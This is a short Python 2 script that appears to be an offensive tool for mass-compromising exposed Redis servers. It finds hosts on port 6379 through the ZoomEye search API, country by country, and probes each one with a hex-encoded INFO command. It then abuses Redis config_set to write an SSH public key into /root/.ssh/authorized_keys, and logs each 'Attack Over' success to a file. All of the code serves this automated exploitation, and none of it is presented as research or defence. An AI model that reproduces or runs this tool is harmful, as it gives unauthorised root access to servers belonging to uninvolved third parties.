#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

import ShoDanAPI
import redis
import socket
import zoomeyeAPI
from Config import *

class CheckRedisStatus(object):
    result = {}
    def __init__(self, address):
        self.address = address
        self.port = 6379

    def getConnection(self):
        try:
            conn = redis.Redis(host=self.address, port=self.port)
            return conn
        except redis.ConnectionError, e:
            print "Connection: %s" % e

    def verifyRedisStatus(self):
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            print self.address
            s.connect((self.address, self.port))
            s.send(payload)
            recvdata = s.recv(1024)
            repr(recvdata)

            if recvdata and 'redis_version' in recvdata:
                if 'os:Windows' not in recvdata:
                    self.result['address'] = self.address
                    self.result['port'] = self.port
                    self.result['recvdata'] = recvdata
                    with open('ips.txt', 'a') as ips:
                        ips.write(self.address+'\r\n')
        except:
            pass
        s.close()
        return self.result

    def write_SSH_KEY(self, ssh_content):
        ssh_content = '\n\n\n\n'+ ssh_content +'\n\n\n\n'
        print ssh_content
        try:
            conn = self.getConnection()
            conn.set(1, ssh_content)
            conn.config_set('dir', '/root/.ssh')
            conn.config_set('dbfilename', 'authorized_keys')
            conn.save()
            print 'Attack Over, SSH authorized_keys Write %s' % self.address
            with open('ok.txt', 'ab') as ok:
                ok.write(self.address)
        except:
            print 'Something Wrong %s' % self.address


if __name__ == "__main__":
    for dm in CountryDomain.domain:
        countryDomain = 'country:'+dm
        zoome = zoomeyeAPI.ZoomeyeAPI('port: 6379 '+ countryDomain)
        for res in zoome.getHostInfo():
            rd = CheckRedisStatus(res)
            rd.verifyRedisStatus()
            rd.write_SSH_KEY(SshConfig.SSH_PUB_KEY)

